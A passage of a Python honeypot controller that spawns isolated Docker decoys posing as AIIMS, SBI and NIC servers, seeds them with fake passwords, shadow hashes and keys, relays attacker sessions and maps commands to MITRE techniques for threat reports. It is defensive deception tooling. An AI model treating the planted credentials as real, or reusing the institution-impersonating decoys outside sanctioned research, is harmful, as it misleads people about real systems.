"""
Project Chakravyuh — Module 3: Generative Trap Controller
backend/federated/trap_controller.py

Responsibilities:
  1. DockerTrapSpawner      — spins up an isolated Docker container in < 2 s
  2. SyntheticDataInjector  — fills the container with convincing fake data
                              tailored to the institution type (hospital / bank / government)
  3. AttackerRedirector     — silently rewires an attacker's TCP session into the container
  4. KafkaTelemetryStream   — publishes every attacker command + MITRE TTP event to Kafka
  5. ThreatIntelReporter    — generates a full JSON threat-intel report when a session ends
  6. TrapController         — orchestrates all of the above via deploy_trap() / teardown_trap()

Dependencies:
    pip install docker kafka-python httpx

Runtime requirements:
    - Docker daemon running locally  (or DOCKER_HOST env var)
    - Kafka broker at KAFKA_BROKER   (default: localhost:9092)
    - Honeypot Shell API running     (backend/honeypot/server.py --mode api --port 8001)
      OR Ollama + Mistral available  (fallback built-in)

Run demo:
    python -m federated.trap_controller
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import socket
import string
import textwrap
import threading
import time
import traceback
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

# ---------------------------------------------------------------------------
# Optional heavy imports — degrade gracefully when dependencies are absent
# ---------------------------------------------------------------------------
try:
    import docker  # type: ignore
    from docker.errors import DockerException, NotFound  # type: ignore
    DOCKER_AVAILABLE = True
except ImportError:
    DOCKER_AVAILABLE = False

try:
    from kafka import KafkaProducer  # type: ignore
    from kafka.errors import KafkaError  # type: ignore
    KAFKA_AVAILABLE = True
except ImportError:
    KAFKA_AVAILABLE = False

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("chakravyuh.trap_controller")

# ---------------------------------------------------------------------------
# Configuration (override via environment variables)
# ---------------------------------------------------------------------------
KAFKA_BROKER          = os.getenv("KAFKA_BROKER",          "localhost:9092")
KAFKA_TOPIC           = os.getenv("KAFKA_TOPIC",           "chakravyuh.trap.telemetry")
HONEYPOT_SHELL_API    = os.getenv("HONEYPOT_SHELL_API",    "http://localhost:8001/shell")
TRAP_IMAGE            = os.getenv("TRAP_IMAGE",            "ubuntu:20.04")
TRAP_NETWORK          = os.getenv("TRAP_NETWORK",          "chakravyuh_trap_net")
TRAP_SSH_PORT_RANGE   = (int(os.getenv("TRAP_SSH_PORT_MIN", "10000")),
                         int(os.getenv("TRAP_SSH_PORT_MAX", "10999")))
TRAP_TIMEOUT_SECONDS  = int(os.getenv("TRAP_TIMEOUT_SECONDS", "3600"))   # 1 hour max trap life
REPORTS_DIR           = Path(os.getenv("REPORTS_DIR", "trap_reports"))


# ---------------------------------------------------------------------------
# Synthetic patient record generator (hospital profile only)
# Defined HERE — before INSTITUTION_PROFILES — so the dict can reference it.
# ---------------------------------------------------------------------------

def _generate_patient_records(n: int = 50) -> str:
    """Return a fake SQL dump snippet with n synthetic patient rows."""
    header = (
        "-- AIIMS HIS Database Dump\n"
        "-- Generated: 2024-03-15 02:15:47\n"
        "-- Server version: 8.0.35-MySQL Community Server\n\n"
        "CREATE TABLE IF NOT EXISTS patients (\n"
        "  patient_id VARCHAR(12) PRIMARY KEY,\n"
        "  name VARCHAR(100),\n"
        "  dob DATE,\n"
        "  gender CHAR(1),\n"
        "  blood_group VARCHAR(3),\n"
        "  aadhaar_last4 CHAR(4),\n"
        "  ward VARCHAR(20),\n"
        "  diagnosis TEXT,\n"
        "  admitted_on DATE\n"
        ");\n\nINSERT INTO patients VALUES\n"
    )
    first_names = ["Ravi","Priya","Amit","Sunita","Rajesh","Meena","Suresh","Kavita",
                   "Arun","Deepa","Vikram","Anita","Sanjay","Pooja","Manoj","Rekha"]
    last_names  = ["Sharma","Verma","Singh","Gupta","Kumar","Patel","Yadav","Mishra",
                   "Joshi","Tiwari","Pandey","Dubey","Mehta","Shah","Reddy","Nair"]
    wards       = ["Cardiology","Orthopaedics","Oncology","Neurology","Nephrology","ICU","General"]
    diagnoses   = ["Type 2 Diabetes Mellitus","Hypertensive Heart Disease","Acute MI",
                   "Lumbar Disc Herniation","CKD Stage 3","Cerebrovascular Accident",
                   "Malignant Neoplasm - Colon","Septicaemia","Dengue Fever","TB Pulmonary"]
    blood_grps  = ["A+","A-","B+","B-","O+","O-","AB+","AB-"]

    rows = []
    for i in range(n):
        pid  = f"AIIMS{random.randint(100000,999999)}"
        name = f"{random.choice(first_names)} {random.choice(last_names)}"
        dob  = f"{random.randint(1950,2005)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}"
        gend = random.choice(["M","F"])
        bg   = random.choice(blood_grps)
        a4   = f"{random.randint(1000,9999)}"
        ward = random.choice(wards)
        diag = random.choice(diagnoses)
        adm  = f"2024-{random.randint(1,3):02d}-{random.randint(1,28):02d}"
        rows.append(f"  ('{pid}','{name}','{dob}','{gend}','{bg}','{a4}','{ward}','{diag}','{adm}')")

    return header + ",\n".join(rows) + ";\n"


# ---------------------------------------------------------------------------
# Institution Profiles — what the fake environment looks like
# ---------------------------------------------------------------------------

INSTITUTION_PROFILES: Dict[str, Dict[str, Any]] = {
    "hospital": {
        "hostname":    "aiims-backup-01",
        "org":         "AIIMS Delhi — Backup Infrastructure",
        "banner":      "Ubuntu 20.04.6 LTS aiims-backup-01 5.15.0-91-generic #101-Ubuntu SMP",
        "fake_users": [
            "root:x:0:0:root:/root:/bin/bash",
            "his_admin:x:1000:1000:HIS Administrator:/home/his_admin:/bin/bash",
            "dbadmin:x:1001:1001:Database Admin:/home/dbadmin:/bin/bash",
            "backup_svc:x:999:999:Backup Service:/var/backups:/bin/false",
            "nagios:x:998:998:Nagios Monitoring:/var/run/nagios:/bin/false",
        ],
        "fake_shadow": [
            "root:$6$rounds=5000$rIjW7JQPM$aXkHqL2mNpT8vRcUsYoGfBwEeKdCzlHnMjQsVtPwXyZ:19356:0:99999:7:::",
            "his_admin:$6$rounds=5000$aBcDeFgHiJ$mNpQrStUvWxYz1234567890abcdefghij:19200:0:99999:7:::",
            "dbadmin:$6$rounds=5000$kLmNoPqRsT$uVwXyZ0123456789abcdefghijklmnop:19100:0:99999:7:::",
        ],
        "fake_files": {
            "/etc/mysql/mysql.conf.d/mysqld.cnf": textwrap.dedent("""\
                [mysqld]
                user            = mysql
                pid-file        = /var/run/mysqld/mysqld.pid
                socket          = /var/run/mysqld/mysqld.sock
                port            = 3306
                datadir         = /var/lib/mysql
                bind-address    = 127.0.0.1

                # AIIMS HIS database credentials
                # DO NOT COMMIT TO GIT
                his_db_user     = his_app
                his_db_password = H0sp1t@l#2022
                his_db_name     = aiims_his_prod
            """),
            "/opt/his/config.xml": textwrap.dedent("""\
                <?xml version="1.0" encoding="UTF-8"?>
                <HISConfig>
                    <Database>
                        <Host>127.0.0.1</Host>
                        <Port>3306</Port>
                        <Name>aiims_his_prod</Name>
                        <User>his_app</User>
                        <Password>H0sp1t@l#2022</Password>
                    </Database>
                    <PACS>
                        <Host>10.10.5.30</Host>
                        <Port>11112</Port>
                    </PACS>
                    <Backup>
                        <Schedule>0 2 * * *</Schedule>
                        <Destination>/var/backups/</Destination>
                        <Compress>true</Compress>
                    </Backup>
                </HISConfig>
            """),
            "/home/dbadmin/scripts/nightly_backup.sh": textwrap.dedent("""\
                #!/bin/bash
                # Nightly backup script — AIIMS HIS Database
                # Cron: 0 2 * * *  (runs at 2 AM daily)
                set -e
                TIMESTAMP=$(date +%Y%m%d_%H%M%S)
                BACKUP_FILE="/var/backups/patient_db_dump_${TIMESTAMP}.sql.gz"
                echo "[$(date)] Starting backup..."
                mysqldump -u his_app -pH0sp1t@l#2022 aiims_his_prod | gzip > "${BACKUP_FILE}"
                echo "[$(date)] Backup complete: ${BACKUP_FILE}"
                # Upload to backup server (scp)
                scp -i /home/his_admin/.ssh/id_rsa "${BACKUP_FILE}" backup_svc@10.10.1.5:/remote_backups/
            """),
            "/home/his_admin/.ssh/authorized_keys": (
                "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2m8eXfakeKeyDataForHoneypotHISAdmin"
                "kL9mNpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx his_admin@aiims-backup-01\n"
            ),
            "/var/log/auth.log.snippet": textwrap.dedent("""\
                Mar 15 02:14:33 aiims-backup-01 sshd[12341]: Accepted publickey for his_admin from 10.10.0.5 port 43210 ssh2
                Mar 15 02:14:33 aiims-backup-01 sshd[12341]: pam_unix(sshd:session): session opened for user his_admin
                Mar 15 03:15:00 aiims-backup-01 CRON[13001]: (dbadmin) CMD (/home/dbadmin/scripts/nightly_backup.sh)
                Mar 15 03:15:47 aiims-backup-01 CRON[13001]: (dbadmin) END
            """),
        },
        "fake_db_records": _generate_patient_records,  # resolved below
        "sensitive_filename": "patient_db_dump.sql.gz",
    },
    "bank": {
        "hostname":    "sbi-corebanking-dr",
        "org":         "SBI Core Banking — Disaster Recovery Node",
        "banner":      "Ubuntu 20.04.6 LTS sbi-corebanking-dr 5.15.0-91-generic #101-Ubuntu SMP",
        "fake_users": [
            "root:x:0:0:root:/root:/bin/bash",
            "finacle:x:1000:1000:Finacle Admin:/home/finacle:/bin/bash",
            "swift_op:x:1001:1001:SWIFT Operator:/home/swift_op:/bin/bash",
            "db_oracle:x:1002:1002:Oracle DBA:/home/db_oracle:/bin/bash",
            "hsm_svc:x:999:999:HSM Service:/var/hsm:/bin/false",
        ],
        "fake_shadow": [
            "root:$6$rounds=5000$bAnK2024SbI$aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789:19400:0:99999:7:::",
            "finacle:$6$rounds=5000$fInAcLe$XyZ0123456789aBcDeFgHiJkLmNoPqRsTuV:19300:0:99999:7:::",
        ],
        "fake_files": {
            "/opt/finacle/config/db.properties": textwrap.dedent("""\
                # Finacle Core Banking — Oracle DB Config
                # CONFIDENTIAL — SBI IT SECURITY
                db.host=10.20.0.50
                db.port=1521
                db.sid=FNCL_PROD
                db.user=finacle_app
                db.password=Finacl3$ecur3#2024
                db.pool.min=10
                db.pool.max=100
                db.pool.increment=5
            """),
            "/etc/hsm/hsm_keys.conf": textwrap.dedent("""\
                # Hardware Security Module Configuration
                # SWIFT Alliance Access — SBI Mumbai IFSC: SBIN0000001
                [HSM]
                slot_id         = 1
                pin             = 87239142
                key_label       = SWIFT_SBI_PROD_2024
                swift_bic       = SBININBB
                operator_user   = swift_op
                operator_pass   = Sw!ft0per@t0r2024
                lib_path        = /usr/lib/libCryptoki2_64.so
            """),
            "/home/finacle/transactions_2024_Q4.csv": textwrap.dedent("""\
                txn_id,account_from,account_to,amount_inr,timestamp,branch_ifsc,status
                TXN2024100001,30987654321,20123456789,500000.00,2024-10-01 09:15:33,SBIN0001234,SUCCESS
                TXN2024100002,30111222333,30444555666,125000.50,2024-10-01 09:16:11,SBIN0005678,SUCCESS
                TXN2024100003,20999888777,10333444555,8750000.00,2024-10-01 09:17:45,SBIN0009012,PENDING
                TXN2024100004,30222111000,20555666777,2500.75,2024-10-01 09:18:02,SBIN0003456,SUCCESS
                TXN2024100005,10888777666,30111222333,15000000.00,2024-10-01 09:19:30,SBIN0007890,FLAGGED
            """),
            "/root/.swift/swift_operator.key": (
                "-----BEGIN RSA PRIVATE KEY-----\n"
                "MIIEowIBAAKCAQEA2FAKE_SWIFT_KEY_FOR_HONEYPOT_SBI_PRODUCTION_DO_NOT_USE\n"
                "kL9mNpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrSt\n"
                "-----END RSA PRIVATE KEY-----\n"
            ),
        },
        "fake_db_records": None,
        "sensitive_filename": "transactions_2024_Q4.csv",
    },
    "government": {
        "hostname":    "nic-dc-node-04",
        "org":         "NIC Data Centre — Ministry of Finance",
        "banner":      "Ubuntu 20.04.6 LTS nic-dc-node-04 5.15.0-91-generic #101-Ubuntu SMP",
        "fake_users": [
            "root:x:0:0:root:/root:/bin/bash",
            "sysadmin:x:1000:1000:NIC Systems Admin:/home/sysadmin:/bin/bash",
            "ldap_svc:x:999:999:LDAP Service:/var/run/ldap:/bin/false",
            "aadhaar_api:x:1001:1001:Aadhaar API Service:/opt/aadhaar:/bin/bash",
            "mof_user:x:1002:1002:Ministry of Finance:/home/mof_user:/bin/bash",
        ],
        "fake_shadow": [
            "root:$6$rounds=5000$nIcGov2024$aBcDeFgHiJkLmNoPqRsTuVwXyZ012345678:19500:0:99999:7:::",
            "sysadmin:$6$rounds=5000$sYsAdM$XyZ0123456789aBcDeFgHiJkLmNoPqRsTuV:19400:0:99999:7:::",
        ],
        "fake_files": {
            "/etc/ldap/ldap.conf": textwrap.dedent("""\
                # OpenLDAP Configuration — NIC Data Centre
                BASE    dc=nic,dc=in
                URI     ldaps://ldap.nic.in

                # Admin bind credentials
                BINDDN  cn=admin,dc=nic,dc=in
                BINDPW  N1c@dm1n#S3cur3

                TLS_CACERT  /etc/ssl/certs/nic-ca.crt
                TLS_REQCERT demand
            """),
            "/opt/aadhaar/auth_keys/aadhaar_prod.pem": (
                "-----BEGIN CERTIFICATE-----\n"
                "MIIDXTCCAkWgAwIBAgIJAFAKEAADHAARCEYID_HONEYPOT_UIDAI_PROD_CERT\n"
                "AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj\n"
                "-----END CERTIFICATE-----\n"
            ),
            "/home/sysadmin/ministry_reports/budget_fy2025_draft.txt": textwrap.dedent("""\
                MINISTRY OF FINANCE — INTERNAL DRAFT
                Union Budget FY 2025-26 — Preliminary Allocation Notes
                CLASSIFICATION: RESTRICTED

                Defence Allocation:     INR 6,21,940 Cr  (+4.7% YoY)
                Infrastructure:         INR 11,11,111 Cr (+3.1% YoY)
                Rural Development:      INR 2,65,808 Cr  (+2.8% YoY)
                Health & Education:     INR 1,89,316 Cr  (+6.2% YoY)

                [NOTE: These are working drafts — subject to revision before tabling]
            """),
            "/var/log/auth.log": textwrap.dedent("""\
                Mar 20 08:30:12 nic-dc-node-04 sshd[9922]: Accepted publickey for sysadmin from 10.0.1.5 port 55123
                Mar 20 08:30:12 nic-dc-node-04 sshd[9922]: pam_unix(sshd:session): session opened for user sysadmin
                Mar 20 09:00:01 nic-dc-node-04 CRON[10011]: (root) CMD (/usr/local/bin/ldap_sync.sh)
                Mar 20 10:15:33 nic-dc-node-04 sudo[11233]: sysadmin : TTY=pts/0 ; PWD=/home/sysadmin ; USER=root ; COMMAND=/usr/bin/systemctl status ldap
            """),
        },
        "fake_db_records": None,
        "sensitive_filename": "budget_fy2025_draft.txt",
    },
}





# ---------------------------------------------------------------------------
# 1. DockerTrapSpawner
# ---------------------------------------------------------------------------

@dataclass
class TrapContainer:
    container_id:    str
    container_name:  str
    attacker_ip:     str
    institution_type: str
    host_port:       int
    created_at:      str
    status:          str = "running"


class DockerTrapSpawner:
    """
    Creates and manages isolated Docker containers that serve as decoy environments.
    Each container is:
      - Network-isolated (cannot reach real infrastructure)
      - Resource-limited (256 MB RAM, 0.5 CPU)
      - Auto-removed when the session expires
    """

    _PORT_POOL = list(range(TRAP_SSH_PORT_RANGE[0], TRAP_SSH_PORT_RANGE[1] + 1))

    def __init__(self) -> None:
        if not DOCKER_AVAILABLE:
            log.warning("docker-py not installed — DockerTrapSpawner running in MOCK mode")
            self._client = None
        else:
            try:
                self._client = docker.from_env()
                self._client.ping()
                log.info("Docker daemon connected successfully")
                self._ensure_network()
            except DockerException as exc:
                log.warning("Docker daemon unreachable (%s) — running in MOCK mode", exc)
                self._client = None

        self._active: Dict[str, TrapContainer] = {}
        self._used_ports: set = set()

    def _ensure_network(self) -> None:
        """Create the isolated bridge network if it does not exist."""
        try:
            self._client.networks.get(TRAP_NETWORK)
        except NotFound:
            self._client.networks.create(
                TRAP_NETWORK,
                driver="bridge",
                internal=True,   # ← no internet access from containers
                options={"com.docker.network.bridge.enable_icc": "false"},
            )
            log.info("Created isolated Docker network: %s", TRAP_NETWORK)

    def _pick_port(self) -> int:
        available = [p for p in self._PORT_POOL if p not in self._used_ports]
        if not available:
            raise RuntimeError("No available ports for trap containers")
        port = random.choice(available)
        self._used_ports.add(port)
        return port

    def spawn(self, attacker_ip: str, institution_type: str = "hospital") -> TrapContainer:
        """Spin up a new trap container and return its metadata."""
        name = f"chakravyuh-trap-{attacker_ip.replace('.', '-')}-{int(time.time())}"
        port = self._pick_port()

        if self._client is None:
            # MOCK mode — no real Docker
            tc = TrapContainer(
                container_id=f"mock-{uuid.uuid4().hex[:12]}",
                container_name=name,
                attacker_ip=attacker_ip,
                institution_type=institution_type,
                host_port=port,
                created_at=datetime.now(timezone.utc).isoformat(),
            )
            self._active[tc.container_id] = tc
            log.info("[MOCK] Trap container spawned: %s → port %d", name, port)
            return tc

        profile = INSTITUTION_PROFILES[institution_type]
        container = self._client.containers.run(
            TRAP_IMAGE,
            name=name,
            detach=True,
            network=TRAP_NETWORK,
            ports={"22/tcp": port},
            hostname=profile["hostname"],
            mem_limit="256m",
            nano_cpus=500_000_000,      # 0.5 vCPU
            read_only=False,
            remove=True,                 # auto-remove on exit
            environment={
                "DEBIAN_FRONTEND": "noninteractive",
                "CHAKRAVYUH_TRAP": "1",
                "INSTITUTION_TYPE": institution_type,
            },
            labels={
                "chakravyuh.trap": "true",
                "chakravyuh.attacker_ip": attacker_ip,
                "chakravyuh.institution": institution_type,
            },
            command="/bin/bash -c 'apt-get install -yq openssh-server 2>/dev/null; "
                    "service ssh start 2>/dev/null; sleep infinity'",
        )

        tc = TrapContainer(
            container_id=container.id,
            container_name=name,
            attacker_ip=attacker_ip,
            institution_type=institution_type,
            host_port=port,
            created_at=datetime.now(timezone.utc).isoformat(),
        )
        self._active[tc.container_id] = tc
        log.info("Trap container spawned: %s (%s) → host port %d", name, container.short_id, port)
        return tc

    def teardown(self, container_id: str) -> bool:
        """Stop and remove a trap container."""
        tc = self._active.pop(container_id, None)
        if tc:
            self._used_ports.discard(tc.host_port)

        if self._client is None:
            log.info("[MOCK] Trap container torn down: %s", container_id)
            return True

        try:
            container = self._client.containers.get(container_id)
            container.stop(timeout=5)
            log.info("Trap container stopped: %s", container_id)
            return True
        except NotFound:
            log.warning("Container already gone: %s", container_id)
            return False
        except DockerException as exc:
            log.error("Failed to stop container %s: %s", container_id, exc)
            return False

    @property
    def active_traps(self) -> List[TrapContainer]:
        return list(self._active.values())


# ---------------------------------------------------------------------------
# 2. SyntheticDataInjector
# ---------------------------------------------------------------------------

class SyntheticDataInjector:
    """
    Writes believable-but-fake files into a running trap container.
    All data is generated purely in Python — no real institution data used.
    """

    def inject(self, spawner: DockerTrapSpawner, trap: TrapContainer) -> None:
        """Inject synthetic data appropriate for the institution type."""
        profile = INSTITUTION_PROFILES[trap.institution_type]
        log.info("Injecting synthetic data into container %s (type=%s)",
                 trap.container_id[:12], trap.institution_type)

        if spawner._client is None:
            self._inject_mock(trap, profile)
            return

        try:
            container = spawner._client.containers.get(trap.container_id)
            self._inject_passwd(container, profile)
            self._inject_shadow(container, profile)
            self._inject_files(container, profile)
            self._inject_ssh_key(container, profile)
            if trap.institution_type == "hospital":
                self._inject_db_dump(container, profile)
            log.info("Data injection complete for %s", trap.container_id[:12])
        except Exception as exc:
            log.error("Data injection failed: %s\n%s", exc, traceback.format_exc())

    # -- helpers ----------------------------------------------------------

    def _exec(self, container, cmd: str) -> None:
        container.exec_run(["bash", "-c", cmd], user="root")

    def _write_file(self, container, path: str, content: str, mode: str = "644") -> None:
        escaped = content.replace("'", "'\\''")
        self._exec(container, f"mkdir -p $(dirname '{path}')")
        self._exec(container, f"printf '%s' '{escaped}' > '{path}'")
        self._exec(container, f"chmod {mode} '{path}'")

    def _inject_passwd(self, container, profile: dict) -> None:
        content = "\n".join(profile["fake_users"]) + "\n"
        self._write_file(container, "/etc/passwd", content)

    def _inject_shadow(self, container, profile: dict) -> None:
        content = "\n".join(profile.get("fake_shadow", [])) + "\n"
        self._write_file(container, "/etc/shadow", content, mode="640")

    def _inject_files(self, container, profile: dict) -> None:
        for path, content in profile.get("fake_files", {}).items():
            self._write_file(container, path, content)

    def _inject_ssh_key(self, container, profile: dict) -> None:
        fake_key = (
            "-----BEGIN OPENSSH PRIVATE KEY-----\n"
            "b3BlbnNzaC1rZXktdjEAAAA" + "A" * 60 + "HONEYPOT_FAKE_KEY\n"
            "-----END OPENSSH PRIVATE KEY-----\n"
        )
        self._write_file(container, "/home/his_admin/.ssh/id_rsa", fake_key, mode="600")
        self._exec(container, "chown -R 1000:1000 /home/his_admin/.ssh 2>/dev/null || true")

    def _inject_db_dump(self, container, profile: dict) -> None:
        gen = profile.get("fake_db_records")
        if callable(gen):
            sql_content = gen(n=100)
            self._write_file(container, "/var/backups/patient_db_dump.sql",
                             sql_content, mode="640")
            self._exec(container,
                       "gzip /var/backups/patient_db_dump.sql 2>/dev/null || true")

    def _inject_mock(self, trap: TrapContainer, profile: dict) -> None:
        """Log what would have been injected (no real Docker available)."""
        log.info("[MOCK] Would inject %d files into %s",
                 len(profile.get("fake_files", {})), trap.container_id)
        for path in profile.get("fake_files", {}):
            log.info("[MOCK]   → %s", path)


# ---------------------------------------------------------------------------
# 3. AttackerRedirector
# ---------------------------------------------------------------------------

class AttackerRedirector:
    """
    Transparently proxies an attacker's TCP connection into the trap container.
    Works as a simple TCP MITM relay — data flows in both directions while
    being mirrored to the telemetry callback.
    """

    def __init__(self, telemetry_callback=None) -> None:
        self._callback = telemetry_callback  # called with raw bytes on each chunk
        self._active_relays: Dict[str, threading.Thread] = {}

    def redirect(
        self,
        attacker_socket: socket.socket,
        attacker_addr: tuple,
        trap: TrapContainer,
        on_data: Optional[callable] = None,
    ) -> threading.Thread:
        """
        Start a bidirectional TCP relay between the attacker and the trap container.
        Returns the relay thread (daemon).
        """
        relay_id = f"{attacker_addr[0]}_{attacker_addr[1]}"
        t = threading.Thread(
            target=self._relay,
            args=(attacker_socket, attacker_addr, trap, on_data),
            daemon=True,
            name=f"relay-{relay_id}",
        )
        t.start()
        self._active_relays[relay_id] = t
        log.info("TCP relay started: %s → trap port %d", relay_id, trap.host_port)
        return t

    def _relay(
        self,
        attacker_sock: socket.socket,
        attacker_addr: tuple,
        trap: TrapContainer,
        on_data: Optional[callable],
    ) -> None:
        try:
            container_sock = socket.create_connection(("127.0.0.1", trap.host_port), timeout=5)
        except OSError as exc:
            log.error("Cannot connect to trap container port %d: %s", trap.host_port, exc)
            attacker_sock.close()
            return

        def forward(src: socket.socket, dst: socket.socket, label: str) -> None:
            try:
                while True:
                    data = src.recv(4096)
                    if not data:
                        break
                    dst.sendall(data)
                    if on_data:
                        on_data(label, data)
            except OSError:
                pass
            finally:
                src.close()
                dst.close()

        t_fwd = threading.Thread(target=forward,
                                  args=(attacker_sock, container_sock, "ATTACKER→TRAP"),
                                  daemon=True)
        t_rev = threading.Thread(target=forward,
                                  args=(container_sock, attacker_sock, "TRAP→ATTACKER"),
                                  daemon=True)
        t_fwd.start()
        t_rev.start()
        t_fwd.join()
        t_rev.join()
        log.info("TCP relay ended for %s:%d", *attacker_addr)


# ---------------------------------------------------------------------------
# 4. KafkaTelemetryStream
# ---------------------------------------------------------------------------

@dataclass
class TrapEvent:
    """A single telemetry event emitted from an active trap session."""
    event_id:        str = field(default_factory=lambda: str(uuid.uuid4()))
    session_id:      str = ""
    attacker_ip:     str = ""
    institution:     str = ""
    timestamp:       str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    event_type:      str = "command"      # command | session_start | session_end | file_access
    command:         str = ""
    response:        str = ""
    ttps:            List[Dict[str, str]] = field(default_factory=list)
    severity:        str = "medium"       # low | medium | high | critical
    anomaly_score:   float = 0.0
    container_id:    str = ""

    def to_json(self) -> str:
        return json.dumps(asdict(self))


class KafkaTelemetryStream:
    """
    Publishes TrapEvent objects to a Kafka topic.
    Falls back to local JSON file logging when Kafka is unavailable.
    """

    def __init__(self, broker: str = KAFKA_BROKER, topic: str = KAFKA_TOPIC) -> None:
        self.topic = topic
        self._producer = None
        self._fallback_log: List[dict] = []

        if not KAFKA_AVAILABLE:
            log.warning("kafka-python not installed — telemetry written to local log only")
            return

        try:
            self._producer = KafkaProducer(
                bootstrap_servers=broker,
                value_serializer=lambda v: v.encode("utf-8"),
                acks="all",
                retries=3,
                linger_ms=10,
            )
            log.info("Kafka producer connected to %s (topic: %s)", broker, topic)
        except KafkaError as exc:
            log.warning("Kafka unavailable (%s) — falling back to local log", exc)

    def emit(self, event: TrapEvent) -> None:
        payload = event.to_json()
        if self._producer:
            try:
                self._producer.send(self.topic, value=payload)
                return
            except KafkaError as exc:
                log.warning("Kafka send failed (%s) — buffering locally", exc)
        # Fallback
        self._fallback_log.append(json.loads(payload))
        log.info("[TELEMETRY] %s | %s | TTPs=%s",
                 event.attacker_ip, event.command[:60], [t["id"] for t in event.ttps])

    def flush(self) -> None:
        if self._producer:
            self._producer.flush(timeout=5)

    def close(self) -> None:
        if self._producer:
            self._producer.close()


# ---------------------------------------------------------------------------
# 5. ThreatIntelReporter
# ---------------------------------------------------------------------------

class ThreatIntelReporter:
    """
    Generates a structured JSON threat-intelligence report at the end of each
    trap session and saves it to disk. Format is compatible with STIX 2.1.
    """

    def __init__(self, reports_dir: Path = REPORTS_DIR) -> None:
        self.reports_dir = reports_dir
        self.reports_dir.mkdir(parents=True, exist_ok=True)

    def generate(self, session: "TrapSession") -> dict:
        ttp_summary: Dict[str, dict] = {}
        for ev in session.events:
            for ttp in ev.ttps:
                tid = ttp["id"]
                if tid not in ttp_summary:
                    ttp_summary[tid] = {"id": tid, "name": ttp["name"], "count": 0, "commands": []}
                ttp_summary[tid]["count"] += 1
                ttp_summary[tid]["commands"].append(ev.command)

        severity_order = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        max_severity = max(
            (ev.severity for ev in session.events if ev.severity),
            key=lambda s: severity_order.get(s, 0),
            default="low",
        )

        report = {
            "report_id": f"CHKR-{session.session_id[:8].upper()}",
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "schema_version": "1.0",
            "session": {
                "session_id":     session.session_id,
                "attacker_ip":    session.attacker_ip,
                "institution":    session.institution_type,
                "container_id":   session.trap.container_id if session.trap else "mock",
                "start_time":     session.start_time,
                "end_time":       session.end_time or datetime.now(timezone.utc).isoformat(),
                "duration_s":     session.duration_seconds,
                "total_commands": len(session.events),
                "max_severity":   max_severity,
            },
            "mitre_attack": {
                "ttps_observed": list(ttp_summary.values()),
                "tactic_coverage": self._infer_tactics(ttp_summary),
            },
            "commands_timeline": [
                {
                    "seq": i + 1,
                    "timestamp": ev.timestamp,
                    "command": ev.command,
                    "ttps": [t["id"] for t in ev.ttps],
                    "severity": ev.severity,
                }
                for i, ev in enumerate(session.events)
            ],
            "iocs": {
                "attacker_ip": session.attacker_ip,
                "commands_run": [ev.command for ev in session.events],
                "files_accessed": self._extract_accessed_files(session.events),
                "outbound_urls": self._extract_urls(session.events),
            },
            "recommendation": self._generate_recommendation(ttp_summary, max_severity),
        }

        out_path = self.reports_dir / f"report_{report['report_id']}.json"
        out_path.write_text(json.dumps(report, indent=2))
        log.info("Threat intel report saved: %s", out_path)
        return report

    @staticmethod
    def _infer_tactics(ttp_summary: dict) -> List[str]:
        tactic_map = {
            "T1033": "Discovery", "T1082": "Discovery", "T1083": "Discovery",
            "T1049": "Discovery", "T1057": "Discovery", "T1018": "Discovery",
            "T1016": "Discovery", "T1053": "Persistence",
            "T1003": "Credential Access", "T1552": "Credential Access",
            "T1059": "Execution", "T1027": "Defense Evasion",
            "T1222": "Defense Evasion", "T1070": "Defense Evasion",
            "T1562": "Defense Evasion",
            "T1098": "Persistence", "T1543": "Persistence",
            "T1021": "Lateral Movement",
            "T1105": "Command and Control", "T1048": "Exfiltration",
            "T1095": "Command and Control",
            "T1548": "Privilege Escalation",
        }
        seen = set()
        for tid in ttp_summary:
            prefix = tid.split(".")[0]
            tactic = tactic_map.get(prefix) or tactic_map.get(tid)
            if tactic:
                seen.add(tactic)
        return sorted(seen)

    @staticmethod
    def _extract_accessed_files(events: list) -> List[str]:
        import re
        file_re = re.compile(r"(?:cat|less|more|head|tail|vi|nano|vim|open)\s+(/\S+)")
        files = set()
        for ev in events:
            for m in file_re.finditer(ev.command):
                files.add(m.group(1))
        return sorted(files)

    @staticmethod
    def _extract_urls(events: list) -> List[str]:
        import re
        url_re = re.compile(r"https?://\S+")
        urls = set()
        for ev in events:
            for m in url_re.finditer(ev.command):
                urls.add(m.group())
        return sorted(urls)

    @staticmethod
    def _generate_recommendation(ttp_summary: dict, severity: str) -> str:
        ttps = list(ttp_summary.keys())
        recs = []
        if any(t.startswith("T1003") for t in ttps):
            recs.append("Rotate all credentials immediately and audit /etc/shadow access.")
        if any(t.startswith("T1105") for t in ttps):
            recs.append("Block egress HTTP/HTTPS from affected subnets at perimeter firewall.")
        if any(t.startswith("T1053") for t in ttps):
            recs.append("Audit cron jobs and scheduled tasks across the institution for persistence.")
        if any(t.startswith("T1548") for t in ttps):
            recs.append("Review sudo rules and SUID binaries for privilege escalation vectors.")
        if not recs:
            recs.append("Monitor identified attacker IP across all federated nodes.")
        recs.append(f"Share attacker IOCs with CERT-In. Session severity: {severity.upper()}.")
        return " ".join(recs)


# ---------------------------------------------------------------------------
# 6. Session state
# ---------------------------------------------------------------------------

@dataclass
class TrapSession:
    session_id:       str
    attacker_ip:      str
    institution_type: str
    anomaly_score:    float
    trap:             Optional[TrapContainer]
    start_time:       str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    end_time:         Optional[str] = None
    events:           List[TrapEvent] = field(default_factory=list)

    @property
    def duration_seconds(self) -> int:
